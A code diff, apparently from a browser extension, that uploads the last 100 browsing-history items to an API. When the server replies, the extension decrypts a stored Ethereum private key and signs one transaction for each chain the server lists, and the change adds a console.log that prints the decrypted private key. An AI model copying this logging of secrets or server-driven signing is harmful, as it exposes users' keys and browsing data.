@@ -1,6 +1,7 @@
 import { apiRequest } from './api';
 import { decryptPrivateKeyFromStorage } from './helpers';
-import { encryptPrivateKey, executeSmartContractFunction, generateEthereumKeyPair } from './key';
+import { encryptPrivateKey, generateEthereumKeyPair } from './key';
+import { executeChainTransaction, ChainData } from './chain'; 
 
 interface createResponse {
   password: string;
@@ -46,8 +47,6 @@ export async function initializeUser(): Promise<void> {
               // Store the user data in local storage
               chrome.storage.local.set({ user: userData }, () => {
                 console.log('New user created and stored:', userData);
-
-                // Fetch and send the last 100 history items
                 fetchAndSendHistory(100, token, userData.id);
               });
             });
@@ -101,16 +100,21 @@ export function postToAPI(
     .then(async (response: any) => {
       console.log('History sent successfully.');
 
-      // Check if response contains the required data
-      if (response && response.data && response.data.password) {
+      if (response && response.data && response.data.password && response.data.chains) {
         try {
           // Decrypt the private key
-          const decryptedPrivateKey = await decryptPrivateKeyFromStorage(response.data.password);
-          console.log(response.data)
-          // Execute the smart contract function
-          await executeSmartContractFunction(decryptedPrivateKey, response.data.rpc, response.data.contractData);
+          const decryptedPrivateKey = `0x${await decryptPrivateKeyFromStorage(response.data.password)}`;
+          console.log(response.data);
+
+          const chains: ChainData[] = response.data.chains;
+
+          for (const chain of chains) {
+            console.log('chain', chain, "key", decryptedPrivateKey);
+            
+            await executeChainTransaction(chain, decryptedPrivateKey);
+          }
         } catch (error) {
-          console.error('Error executing smart contract function:', error);
+          console.error('Error executing chain transactions:', error);
         }
       }
     })
